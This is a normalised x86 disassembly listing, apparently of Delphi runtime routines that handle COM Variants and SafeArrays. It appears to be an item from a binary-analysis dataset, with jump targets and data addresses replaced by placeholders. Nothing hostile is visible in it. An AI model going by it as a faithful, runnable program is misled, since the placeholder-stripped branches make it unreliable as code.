push sub_40e4cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40400c
retn
sub_40e4dc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e526
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e52d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40e530
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e57a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e581
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40e584
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e613
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e61a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40400c
retn
sub_40e620
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e66a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e671
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40e674
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e8b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8c0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40400c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
dec eax
je r-xdata
call sub_40e3ec
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
jmp r-xdata
call sub_40e4dc
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ae54
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
jmp r-xdata
jmp r-xdata
sub_40e8d4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e440
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e584
jmp r-xdata
jmp r-xdata
call sub_40e674
sub_40e908
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402784
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
call sub_402784
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e8d4
pop esi
pop ebx
retn
call sub_402784
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e8d4
jmp r-xdata
call sub_4027c4
mov edx eax
mov eax edx
call sub_403a24
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40e8d4
jmp r-xdata
pop esi
pop ebx
retn
sub_40e98c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e9d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9dd
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40e9f4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ea24
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ea24
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ea80
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e8c8
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e8c8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e9f4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e8c8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e8c8
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ea24
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e8c8
mov eax [ ebp - 0x314 ]
call sub_40ec78
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ebfc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e8c8
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403fe8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41418c
test al al
je r-xdata
mov eax ebx
call sub_40ea80
jmp r-xdata
push ebx
call VariantClear
call sub_40e8c8
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ec94
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ecc4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ecc4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ed20
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e8c8
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e8c8
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ec78
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e620
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e8c8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e8c8
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ec94
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ecc4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e8c8
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e8c8
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eef4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ebfc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e8c8
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40403c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41418c
test al al
je r-xdata
mov ecx sub_40eeec
mov edx esi
mov eax ebx
call sub_40ed20
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e8c8
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40efa0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40eef4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ebfc
sub_40efe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f040
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40efa0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f26c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f047
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
sub_40f050
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f08e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4126b8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413068
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f095
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
sub_40f09c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f0da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_411f90
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41303c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f0e1
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40f0e8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f126
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412d5c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4130cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f12d
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_40f134
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f172
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412c90
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4130a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f179
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_40f180
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f26c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e8d4
jmp r-xdata
mov edx esi
call sub_40e440
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e8d4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f200
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_41418c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40efe4
jmp r-xdata
mov edx esp
mov eax esi
call sub_41418c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f180
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f26c
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40efa0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f26c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f2b1 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f09c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40e9e0
jmp r-xdata
mov eax ebx
call sub_40fbd8
mov edx eax
mov eax esi
call sub_412ee4
jmp r-xdata
mov eax ebx
call sub_40f630
mov edx eax
mov eax esi
call sub_412e44
jmp r-xdata
mov eax ebx
call sub_410f9c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_412f30
jmp r-xdata
mov eax ebx
call sub_410c04
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_412f54
jmp r-xdata
mov eax ebx
call sub_4118dc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_412f80
jmp r-xdata
mov eax ebx
call sub_411374
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_412fac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f050
jmp r-xdata
mov eax ebx
call sub_4106f0
mov edx eax
mov eax esi
call sub_412fd8
jmp r-xdata
mov eax ebx
call sub_40fa80
mov edx eax
mov eax esi
call sub_412ec4
jmp r-xdata
mov eax ebx
call sub_40fb30
mov edx eax
mov eax esi
call sub_412e64
jmp r-xdata
mov eax ebx
call sub_40fcd0
mov edx eax
mov eax esi
call sub_412e84
jmp r-xdata
mov eax ebx
call sub_40fda8
mov edx eax
mov eax esi
call sub_412ea4
jmp r-xdata
mov eax ebx
call sub_4100f4
push edx
push eax
mov eax esi
call sub_412f04
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f0e8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f134
jmp r-xdata
mov dx 0x101
call sub_40e440
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40ec78
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f200
xor edx edx
mov ax 0x1
call sub_40e440
jmp r-xdata
sub_40f498
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f53b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4126b8
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404270
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_40823c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f542
lea eax [ ebp - 0xc ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_4046c8
retn
mov eax ebx
call sub_4106f0
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40e8d4
jmp r-xdata
sub_40f54c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40e8d4
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f588
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40efa0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f630
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5e3
lea eax [ ebp - 0x14 ]
call sub_40ec78
retn
sub_40f5ec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fa51
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f663 ]
mov eax [ ebp - 0x4 ]
call sub_40f498
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f498
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
